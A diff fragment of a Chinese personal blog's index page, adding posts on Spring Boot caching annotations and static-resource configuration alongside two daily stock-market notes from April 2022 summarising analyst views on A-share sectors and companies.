+<li>@Cacheable<br>添加在方法上,根据条件添加缓存</li>
+</ul>
+<p>value:  缓存的名称,不能为空<br>cacheNames:  缓存的名称,和value二选一<br>key:  缓存的key,默认为空,表示使用方法的参数类型及参数值作为key,支持SpEL<br>keyGenerator:  指定key的生成策略(和key不能共存)<br>cacheManager:  指定缓存管理器<br>cacheResolver:  指定获取解析器<br>condition:  条件符合则缓存<br>unless:  条件符合则不缓存<br>sync:  是否使用异步模式 默认false</p>
+<ul>
+<li><p>@CachePut<br>添加在方法上,根据条件添加缓存<br>@CachePut作用和@Cacheable类似,区别是 <em><strong>@Cacheable没有缓存数据会执行方法后,把结果缓存起来,第二次调用方法不执行方法,直接从缓存中获取数据并返回.@CachePut每次都会执行方法,不管缓存中有没有数据,都会把结果缓存.</strong></em> </p>
+</li>
+<li><p>@CacheEvict<br>添加在方法上,根据条件清空缓存.<br>value:  缓存名称,不能为空<br>cacheNames: 缓存的名称,与value二选一<br>keyGenerator:  key的生成器。key&#x2F;keyGenerator二选一使用<br>condition:  触发条件,支持SpEL<br>allEntries:  true表示清除value中的全部缓存,默认为false<br>beforeInvocation:  是否在方法执行前就清空 默认false<br>cacheManager:  指定缓存管理器<br>cacheResolver:  或者指定获取解析器</p>
+</li>
+<li><p>@CacheConfig<br>作用在类上,为本类的缓存注解配置全局属性<br>cacheNames:  缓存名称<br>keyGenerator:  key的生成器<br>cacheManager:  缓存管理器<br>cacheResolver:  获取解析器</p>
+</li>
+<li><p>@EnableCaching： 开启缓存</p>
+</li>
+</ul>
+<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol>
+<li>Spring boot默认使用的是SimpleCacheConfiguration，即使用ConcurrentMapCacheManager来实现缓存，ConcurrentMapCache实质是一个ConcurrentHashMap集合对象java内置，所以无需引入其他依赖，也没有额外的配置</li>
+<li>Caffeine是使用Java8对Guava缓存的重写版本，在Spring Boot 2.0中将取代，基于LRU算法实现，支持多种缓存过期策略</li>
+<li>StringRedisTemplate默认采用的是String的序列化策略，保存的key和value都是采用此策略序列化保存的。（JdkSerializationRedisSerializer）RedisTemplate默认采用的是JDK的序列化策略，保存的key和value都是采用此策略序列化保存的。（StringRedisSerializer)</li>
+<li>如果使用redis可以配置如下依赖<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- redis starter --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- lettuce pool 缓存连接池 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<blockquote>
+<p>不再需要引入其他依赖,SpringBoot导入spring-boot-starter-data-redis时, CacheManager默认使用RedisCache.</p>
+</blockquote>
+<p>否则可以配置如下依赖</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>在不指定缓存 key 属性的情况下，默认使用 SimpleKeyGenerator 生成 key。除此之外，我们也可以自定义实现 KeyGenerator 接口，生成自己的 key 名称策略。</li>
+</ol>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/springboot/" rel="tag">springboot</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%93%E5%AD%98/" rel="tag">缓存</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-股票-20220407"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2022/04/07/%E8%82%A1%E7%A5%A8-20220407/"
+    >股票-20220407</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/04/07/%E8%82%A1%E7%A5%A8-20220407/" class="article-date">
+  <time datetime="2022-04-07T01:25:21.000Z" itemprop="datePublished">2022-04-07</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%8A%95%E8%B5%84-%E8%82%A1%E7%A5%A8/">投资 - 股票</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="房地产（中南建设等）"><a href="#房地产（中南建设等）" class="headerlink" title="房地产（中南建设等）"></a>房地产（中南建设等）</h3><p>①国联证券郭荆璞估计，单考虑地产投资增速下滑8-10%以及相应的一二手房成交的低迷，就可能使得中国2022年GDP增速下滑到4%出头的水平，若要实现5.5的GDP增长目标，地产政策或将持续调整；<br>②房地产股当前PB处在过去10年9.28%的低估值分位水平，在政策边际改善，叠加稳增长和低估值双重催化，行业或有望迎来戴维斯双击，在此轮房地产周期中，政策目标核心是“维护房地产市场的健康发展，维护住房消费者的合法权益”，因此稳健型房企有望胜出；<br>③郭荆璞从量化角度挑选出中南建设，根据市场一致性预期，目前公司市盈率和市净率分别为4.43&#x2F;0.49倍，在行业中处于低估水平，公司以房地产开发和建筑为主业，土储集中于长三角城市圈及二三线城市，此外公司拥有上海数据交易中心6%的股权，有望受益于数字经济加速发展；<br>④风险提示：宽松政策不及预期等。</p>
+<p>阳光医疗<br>阳普医疗：公司是新冠抗原自测上游辅料的生产商。</p>
+<p>舒泰神，新冠特效药<br>有投资者向舒泰神提问， 尊敬的董秘！贵公司一开始就采用多路线研发COVID-19新冠肺炎的特效药，BDB-001注射液外，STSA-1005和STSA-1002目前研发进度如何？三者正在推进中？还是已经研发失败？请如实回答！谢谢！ 公司回答表示，您好！BDB-001、STSA-1002、STSA-1005项目均在推进中，有关项目进展，敬请关注后续项目进展公告及定期报告。感谢您对公司的关注，谢谢</p>
+<p>永太科技（新能源，钠离子电池，新冠药）<br>近期，北京中科海钠科技有限责任公司发生工商变更，新增华为旗下深圳哈勃科技投资合伙企业（有限合伙）等为股东。中科海钠官网资料显示，中科海钠是一家专注于新一代储能体系-钠离子电池研发与生产的高新技术型企业。企业拥有多项钠离子电池核心专利，是国际少有拥有钠离子电池核心专利与技术的电池企业之一。A股钠离子电池概念股主要有永太科技、翔丰华等。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%95%E8%B5%84/" rel="tag">投资</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%82%A1%E7%A5%A8/" rel="tag">股票</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-股票-20220406"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2022/04/06/%E8%82%A1%E7%A5%A8-20220406/"
+    >股票-20220406</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/04/06/%E8%82%A1%E7%A5%A8-20220406/" class="article-date">
+  <time datetime="2022-04-06T00:51:11.000Z" itemprop="datePublished">2022-04-06</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%8A%95%E8%B5%84-%E8%82%A1%E7%A5%A8/">投资 - 股票</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="题材"><a href="#题材" class="headerlink" title="题材"></a>题材</h2><h3 id="中药"><a href="#中药" class="headerlink" title="中药"></a>中药</h3><p>《“十四五”中医药发展规划》助推中药振兴，“新冠防控+服务出口+消费升级”有望打开行业增量，分析师称政策扶植带来的重大利好尚未充分体现<br>2022-03-31 18:02 星期四<br>中药（康缘药业、昆药集团、浙江震元）：<br>①国务院办公厅近日印发《“十四五”中医药发展规划》，提出推动中医药参与新冠防控国际合作，高质量建设国家中医药服务出口基地等，这是首次以国办名义印发的医药细分子行业的五年规划；<br>②中信证券陈竹认为，中药板块作为低估值以及政策避风港板块，本轮行情具有中长期可持续性，截至2022年3月25日，目前中药板块平均PE为33倍，部分核心龙头OTC企业估值只有15-20倍，政策扶植和市场扩容带来的重大利好还未充分体现；<br>③中药医保支付新政策重大利好，纳入医保支付的同时暂不纳入DRG付费，药厂在医保支付范围内获得了更灵活的定价空间，对整个中药行业带来比较显著的影响；<br>④陈竹重点看好业绩增长的持续性与估值相匹配、中药创新药增量逻辑、中医服务提供商等核心细分领域；<br>⑤风险提示：政策落地不及预期、中成药集采降价超预期、OTC和配方颗粒竞争超预期等。<br>主题一<br>《“十四五”中医药发展规划》助推中药振兴，“新冠防控+服务出口+消费升级”有望打开行业增量，分析师称政策扶植带来的重大利好尚未充分体现国务院办公厅近日印发《“十四五”中医药发展规划》，提出到2025年，中医药健康服务能力明显增强，中医药高质量发展政策和体系进一步完善，并推动中医药参与新冠防控国际合作，高质量建设国家中医药服务出口基地等。值得注意的是，这是首次以国办名义印发的医药细分子行业的五年规划。中信证券陈竹认为，中药板块作为低估值以及政策避风港板块，本轮行情具有中长期可持续性，短期可关注结构性机会，中长期关注受益于政策推动、创新研发以及消费升级的标的企业。截至2022年3月25日，目前中药板块平均PE为33倍，仅高于器械和商业流通板块，部分核心龙头OTC企业估值只有15-20倍，政策扶植和市场扩容带来的重大利好还未充分体现，2022年将是中医药板块投资的关键一年。<br>陈竹梳理出三条主线：<br>①业绩增长的持续性与估值相匹配：华润三九、红日药业、羚锐制药、太极集团、昆药集团；<br>②中药创新药增量逻辑：以岭药业、康缘药业；<br>③中医服务提供商：新中医诊疗龙头，OMO模式全国布局持续推进的 浙江震元。<br>近期中药行情波动的底层逻辑<br>（1）中药创新研发迅速崛起，注册审批加快：2017年-2021年，国家药监局共计20个新药获批上市，其中2021年共计12个新药获批上市，是近5年来获批中药新药最多的一年；<br>（2）政策利好：国家中医药管理局和国家医保局联合发布了《关于医保支持中医药传承创新发展的指导意见》，首次从支付端出台了中药扶持政策，对整个中药行业带来比较显著的影响；<br>（3）集采政策的温和预期和医保免疫的大健康消费属性：根据湖北省联盟集采结果看中成药降价幅度低于化学药，政策预期温和可控。</p>
+<p>中药绝大部分为OTC药物，具有消费品和保健品属性，属于医保免疫区。行业中期受益于政策带来的格局优化<br>（1）中药医保支付新政策重大利好。纳入医保支付的同时暂不纳入DRG付费，药厂在医保支付范围内获得了更灵活的定价空间。<br>（2）2022年是中成药集采元年，湖北省联合19省联盟组织的中成药集采显示，本次集采有157家企业的182个产品参与报价，其中97家企业、111个产品中选，中选率达62%，拟中选价格平均降幅42.27%。相较前几轮的化药集采、医保谈判，湖北中成药集采降价幅度较为温和。<br>（3）中药配方颗粒市场空间打开和竞争格局优化有利于龙头企业。目前我国中药饮片市场规模在2000亿左右，中药配方颗粒占饮片市场份额约20%，预计中药配方颗粒市场规模可达500亿元，远期市场规模可达1000亿元。陈竹认为，未来中药发展必然是以品牌+大健康为主的发展战略，一部分有保密配方高护城河的中药瑰宝类药物，高端的定价和部分特殊的中药材种类，使得部分产品具有奢侈品属性，成为保值、增值的奢侈品，重点企业包括片仔癀、同仁堂。 </p>
+<h3 id="数字人民币"><a href="#数字人民币" class="headerlink" title="数字人民币"></a>数字人民币</h3><p>占“半壁江山”！建行数字人民币累计交易额达435亿元，这家公司与其共同研发数字人民币智慧设备<br>2022-03-31 14:02 星期四</p>
+<p>建行年报数据显示，截至2021年末，建行数字人民币累计交易笔数8475万余笔，累计交易金额435亿元。这一数字约占全国数字人民币总交易额近五成。</p>
+<p>央行数据显示，截至2021年12月31日，全国数字人民币试点场景已超过808.51万个，累计开立个人钱包2.61亿个，交易金额875.65亿元。 行业动态</p>
+<p>数字人民币先后经历两轮试点，当前发展进入快车道从试点城市来看，2019年末央行在深圳、苏州、雄安、成都及2022北京冬奥会场景开展数字人民币第一批试点测试。2020年11月开始，增加上海、海南、长沙、西安、青岛、大连6个新的试点地区。第三批试点区域即将落地。</p>
+<p>目前，两轮共10个试点城市和1个试点场景已经运行接近2年，应用场景也已经涵盖了生活缴费、餐饮服务、交通出行、购物消费、政务服务等领域。</p>
+<pre><code>券商观点
+</code></pre>
+<p>安信证券夏瀛韬研报认为，考虑到第19届亚运会将于2022年9月在浙江杭州举办（宁波、温州、金华、绍兴、湖州协办），杭州亚运会有望成为继北京冬奥会后，数字人民币又一对外展示的重要窗口。</p>
+<p>华安证券尹沿技认为，数字人民币的推广将为相关生态产业带来长期、可持续的投资机遇。看好商业银行侧投资机遇，银行软件系统需要对接央行发行库，柜台机、ATM机等金融机具需要开通相关功能以支持数字人民币的兑换、流通和回笼。</p>
+<pre><code>产业链相关公司
+
+广电运通 携手建行打造的数字人民币智慧柜员机正式试点上线，数字人民币智慧柜员机广泛应用于2022年北京冬奥会机场、海关等多个场景，为科技冬奥打造便捷支付环境。
+
+创识科技 关于数字人民币方面，公司目前已经与农行、建行、中行、邮储银行和交通银行等展开合作。
+</code></pre>
+<h3 id="三农-化肥"><a href="#三农-化肥" class="headerlink" title="三农-化肥"></a>三农-化肥</h3><p>解决好“三农”问题重中之重，该行业有望先乘农化大周期之势延续高景气，再切入新能源提升业绩弹性<br>2022-04-01 13:32<br>农化大周期下，全球粮价高企且化肥库存低位，行业高景气有望至少持续1-2年，目前磷化工的头部企业基本已完成上游资源的整合，切入新能源进一步提升业绩弹性，分析师看好行业利润更加偏向上游的同时，竞争格局也将得到持续优化。<br>磷化工（川金诺、湖北宜化、云天化）精要：</p>
+<p>①当前粮价高企+磷肥库存低位，西部证券杨晖看好农化大周期下化肥高景气有望至少持续1-2年，并且行业景气或随出口限制放松得到延续；</p>
+<p>②中长期看，磷酸铁锂的需求爆发直接带动“磷矿石-黄磷-磷酸-磷酸铁”景气度，2022年磷酸铁供应缺口犹存，磷化工资源属性凸显；</p>
+<p>③杨晖认为目前磷化工的头部企业基本已完成上游资源的整合，切入新能源进一步提升业绩弹性，行业利润更加偏向上游的同时，行业竞争格局也将得到持续优化；</p>
+<p>④风险因素：安全事故影响开工、环保政策变化、技术路线快速迭代更新等。</p>
+<p>解决好“三农”问题重中之重，该行业有望先乘农化大周期之势延续高景气，再切入新能源提升业绩弹性</p>
+<p>事件：《求是》杂志发表中共中央总书记、国家主席、中央军委主席习近平的重要文章《坚持把解决好“三农”问题作为全党工作重中之重，举全党全社会之力推动乡村振兴》。</p>
+<p>农化大周期之下，本栏目于3月28日《强资源属性+海外套利窗口打开+全球刚需，通胀主线不能忽视这个品种，A股这些公司具备核心保供能力》一文中引用分析师观点，认为当前全球通胀要买上游资源，衰退要买必选消费，化肥兼具两者逻辑，攻守兼备。</p>
+<p>今日，西部证券杨晖专题覆盖磷化工行业，认为当前粮价高企+磷肥库存低位，看好农化大周期下化肥高景气有望至少持续1-2年，并且行业景气或随出口限制放松得到延续。</p>
+<p>中长期看，磷酸铁锂的需求爆发直接带动“磷矿石-黄磷-磷酸-磷酸铁”景气度，2022年磷酸铁供应缺口犹存，磷化工资源属性凸显。</p>
+<p>杨晖认为目前磷化工的头部企业基本已完成上游资源的整合，切入新能源进一步提升业绩弹性，重点公司包括：云天化、湖北宜化、兴发集团、新洋丰、云图控股、川发龙蟒、川恒股份、中毅达、川金诺、金诚信等。</p>
+<p>粮价高企+库存低位，农化大周期下化肥高景气有望持续</p>
+<p>当前粮价维持高位将驱动化肥行业需求提升，据Mosaic预测2022年我国磷肥需求增长幅度将在3.5%至6.4%之间。</p>
+<p>受粮价高位、原材料价格支撑和下游需求拉动，当前化肥价格坚挺，且有望在春耕旺季来临之际迎来价格再度上行。</p>
+<p>短期来看，全球及国内磷肥库存处于低位，此波农化大周期下化肥的高景气有望至少持续1-2年。</p>
+<p>中长期来看，此前的出口禁令带来的国际磷肥价格与国内价格形成3500元&#x2F;吨以上的较大价差，市场预期国家可能在春耕之后放开化肥的出口限制。</p>
+<p>磷化工企业切入新能源提升业绩弹性，磷酸铁2022年供应缺口犹存</p>
+<p>当前国内磷酸铁总产能为64.5万吨，磷酸铁锂总产能为77.6万吨，磷酸铁处于供不应求状态。</p>
+<p>从扩产计划看，磷化工企业为未来磷酸铁扩产的主力，占到总扩产计划的55%，且从扩产节奏看，预计2022年全年磷酸铁仍将处于供需错配的状态。</p>
+<p>从实际进度看，磷酸铁的扩产将受到环评、能评、工艺等各项限制，同时下游产品验证周期可能导致产能释放低于预期，杨晖看好供需错配格局下磷酸铁景气的延续。</p>
+<p>中长期磷化工资源属性凸显，供给侧改革持续优化行业竞争格局</p>
+<p>当前国内磷矿石资源面临短缺压力，同时随着碳中和、能耗双控、产能指标等各种供给端控制措施的联合限制，一些资源禀赋布局领先的企业将展现出更强的竞争力。</p>
+<p>杨晖认为行业利润更加偏向上游的同时，行业竞争格局也将得到持续优化。</p>
+<p>目前磷化工的头部企业基本已完成上游资源的整合，产业链一体化完善，具备充足的资源、成本、能耗指标等优势。</p>
+<h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="翠微股份（消费，购物，数字货币，芯片）"><a href="#翠微股份（消费，购物，数字货币，芯片）" class="headerlink" title="翠微股份（消费，购物，数字货币，芯片）"></a>翠微股份（消费，购物，数字货币，芯片）</h3><p>子公司海科融通从事第三方支付业务，拥有全国范围的从业资质。已经与多家银行在数字人民币线下收单领域达成合作。具备数字人民币跨行收单能力。目前旗下所有商场均可使用 数字人民币 购物。公司参股了北京核芯达科技有限公司，专注于面向L4级自动驾驶处理器和车载智能语音芯片的研发。为国内车企关键芯片领域提供一流解决方案。首款智能语音芯片已经与 2021 年上半年流片并与全球第二大天窗厂商 英纳法在车顶多音区领域 展开独家合作。</p>
+<h3 id="莱茵生物（工业大麻）"><a href="#莱茵生物（工业大麻）" class="headerlink" title="莱茵生物（工业大麻）"></a>莱茵生物（工业大麻）</h3><p>4月1日，美国众议院以220票对204票第二次通过联邦医用大麻合法化法案（MORE Act）；同时参议院联邦合法化法案《大麻管理与机会法案》（CAOA）预计将于4月提交，联邦层面医用大麻合法化加速推进。随着美国工业大麻法规政策持续向好，市场有望快速扩容，利好产业链相关布局企业，尤其是具备规模化生产能力的代工厂以及品牌企业或将迎来快速发展机遇。莱茵生物于2019年正式布局工业大麻，截至2021Q3已累计投资8000万美元在美建立全球最大工业大麻提取工厂，被印第安纳州政府列为示范项目，预计该项目将于2022年6月30日前达成正式量产，年处理原料5000吨，项目毛利率可达50%，同时已与一家全球工业大麻主流企业签订《受托加工意向协议》，后续预计还有更多订单意向。从技术角度来看，莱茵生物目前走得偏趋势而非连板，以5日线为趋势，每一次回落都得到了支撑，那么周五莱茵生物的断板可能会带来低吸机会。</p>
+<h3 id="盛航股份（航运）"><a href="#盛航股份（航运）" class="headerlink" title="盛航股份（航运）"></a>盛航股份（航运）</h3><p>目前次新股出现了一个空窗期，上交所在4月20日之前没有新股上市，另外每当巨无霸上市，次新都有提前造势的案例，比如三峡能源对应顺控发展，中国电信对应华菱线缆，中国移动对应三羊马，那么中海油上市前次新大概率也会有妖股的出现。目前连板的盛航股份就是妖股的潜在备选标的之一，从基本面来说，目前公司在行业紧平衡的情况下，上市后通过购买船舶提升市场份额，22年30艘，25年50艘，意味着公司市场份额有望得到快速提升，中期市场份额可接近20%。再加上疫情影响，运力紧张，而各大型炼化项目在“十四五”期间将会迎来密集投产期，极大推动相关石化产品的水上运输需求，公司市场份额的提升有望进一步加快。再从投机的角度思考，该股本身还叠加高送转，填权之后股价也比较低。</p>
+<h3 id="招商积余-（地产，物业）"><a href="#招商积余-（地产，物业）" class="headerlink" title="招商积余 （地产，物业）"></a>招商积余 （地产，物业）</h3><p>背靠央企的地产服务龙头，控股股东土储充足支撑中期扩张，有望受益此轮行业格局重构<br>2022-03-31 13:39<br>公司是招商局集团旗下的央企物管旗舰，控股股东招商蛇口实力雄厚，多维度支持业务发展，去年年度新签合同额30.5亿元，新增管理面积9013万平米，分析师看好公司大物业+大资管双轮驱动，有望受益行业格局重构。<br>招商积余（001914）精要：</p>
+<p>①公司为招商局集团旗下物业资产管理与服务平台，2021年末管理面积2.8亿平米，年度新签合同额30.5亿元，同比增长24%，新增管理面积9013万平米，处央企物管领先水平；</p>
+<p>②地方国资和央企优势在于融资能力和成本拥有银行支持，平安证券杨侃看好公司控股股东招商蛇口实力雄厚，多维度支持业务发展，实控人招商局集团生态资源丰富，利于在增值服务等业务层面形成协同；</p>
+<p>③公司2021年底摘牌上航物业100%股权、南航物业95%股权，增资扩股汇勤物业，2022年初确定转让深圳中航城、昆山中航、赣州九方三家公司股权，轻重分离积极推进，提质增效成果可期；</p>
+<p>④杨侃看好公司作为央企物管领先者，有望受益行业格局重构，预计2022-24年EPS分别为0.62元&#x2F;0.79元&#x2F;1元，对应PE分别为27.7&#x2F;21.8&#x2F;17.3倍；</p>
+<p>⑤风险因素：控股股东交付节奏不及预期风险、外拓进程不及预期风险。</p>
+<p>近期多地出台楼市新政稳定市场预期，当下市场，相对二线企业，地方国资和央企优势在于融资能力和成本拥有银行支持，地方政府保交付任务也会助力国资企业带来更大优势。</p>
+<p>今日，平安证券杨侃深度覆盖招商积余，公司为招商局集团旗下物业资产管理与服务平台，2019年重组上市，属A股物管稀缺标的。</p>
+<p>公司控股股东招商蛇口实力雄厚，资源禀赋优势突出，利于在增值服务等业务层面形成协同，全业态市场化能力显著。</p>
+<p>公司2022年初确定转让深圳中航城、昆山中航、赣州九方三家公司股权，轻重分离积极推进，提质增效成果可期。</p>
+<p>杨侃看好公司作为央企物管领先者，有望受益行业格局重构，预计2022-24年EPS分别为0.62元&#x2F;0.79元&#x2F;1元，对应PE分别为27.7&#x2F;21.8&#x2F;17.3倍。</p>
+<p>招商积余是央企物管领先者，大物业+大资管双轮驱动</p>
+<p>招商积余为招商局集团旗下物业资产管理与服务平台，目前发展物业管理、资产管理两项核心业务。</p>
+<p>公司2021年末管理面积2.8亿平米，年度新签合同额30.5亿元，同比增长24%，新增管理面积9013万平米，处央企物管领先水平。</p>
+<p>物业管理以“沃土云林”商业模式为依托，持续向好发展，2021年收入贡献93.6%，毛利润贡献77.7%。</p>
+<p>商业运营2021年末在管商业项目（含筹备）44个，初具规模，2021年收入贡献5.3%，毛利润贡献21.4%。</p>
+<p>招商积余控股股东资源禀赋优势突出，全业态市场化能力显著</p>
+<p>杨侃看好公司控股股东招商蛇口实力雄厚，多维度支持业务发展，包括积极销售保障短期交付，土储充足支撑中期扩张，持有物业“双百”战略推动资管业务持续突破。</p>
+<p>长远来看，招商蛇口有望受益房地产格局优化，为公司规模发展带来更大想象空间。实控人招商局集团生态资源丰富，利于在增值服务等业务层面形成协同。</p>
+<p>此外，公司具备较强市场化发展能力、全业态综合服务能力，行业竞争加剧下有助于强化综合实力、保障份额获取。</p>
+<p>2021年第三方管理面积占比67.7%，住宅、非住宅管理面积占比41%、59%；第三方管理面积1.9亿平米，处行业领先水平。</p>
+<p>招商积余轻重分离积极推进，提质增效成果可期</p>
+<p>公司2021年底摘牌上航物业100%股权、南航物业95%股权，增资扩股汇勤物业，实现重组上市以来收并购首次突破。</p>
+<p>公司2022年初确定转让深圳中航城、昆山中航、赣州九方三家公司股权，轻重资产分离迈出实质性步伐。</p>
+<p>目前，公司已落地100余项改善举措，杨侃看好伴随业务及管理能力提升，预计公司盈利能力、业务获取能力亦有望随之提振[图片]</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%95%E8%B5%84/" rel="tag">投资</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%82%A1%E7%A5%A8/" rel="tag">股票</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-springboot加载静态资源的坑"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2022/04/04/springboot%E5%8A%A0%E8%BD%BD%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E5%9D%91/"
+    >springboot加载静态资源的坑</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/04/04/springboot%E5%8A%A0%E8%BD%BD%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E5%9D%91/" class="article-date">
+  <time datetime="2022-04-04T01:37:44.000Z" itemprop="datePublished">2022-04-04</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/">技术生活 - 编程技术 - 后端技术</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>我们知道springboot中，已经预定义了一些配置，这些配置，指定了静态资源的位置和url访问方式。即使不作任何设置，放在resources下面的public static 等文件夹的静态资源也可以被访问到。也可以在application.yml&#x2F;application.properties文件内更改配置。具体有两个配置项目。</p>
+<ul>
+<li>spring.mvc.static-path-pattern：根据官网的描述和实际效果，可以理解为静态文件URL匹配头，也就是静态文件的URL地址开头。Springboot默认为：&#x2F;**。</li>
+<li>spring.web.resources.static-locations：根据官网的描述和实际效果，可以理解为实际静态文件地址，也就是静态文件URL后，匹配的实际静态文件。Springboot默认为：classpath:&#x2F;META-INF&#x2F;resources&#x2F;,classpath:&#x2F;resources&#x2F;,classpath:&#x2F;static&#x2F;,classpath:&#x2F;public&#x2F;</li>
+</ul>
+<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>我做的时候，给用成了spring.resources.static-locations，结果始终不生效！！！原来这个是老版本的配置。记录一下，高版本springboot用这个配置 <em><strong>spring.web.resources.static-locations</strong></em></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpringBoot/" rel="tag">SpringBoot</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/" rel="tag">问题解决</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
   id="post-thikphp-5-x-隐藏管理入口"
   class="article article-type-post"
   itemscope
@@ -572,434 +984,13 @@
 </article>
 
     
-    <article
-  id="post-股票-20220321"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2022/03/21/%E8%82%A1%E7%A5%A8-20220321/"
-    >股票-20220321</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2022/03/21/%E8%82%A1%E7%A5%A8-20220321/" class="article-date">
-  <time datetime="2022-03-21T00:13:13.000Z" itemprop="datePublished">2022-03-21</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%8A%95%E8%B5%84-%E8%82%A1%E7%A5%A8/">投资 - 股票</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
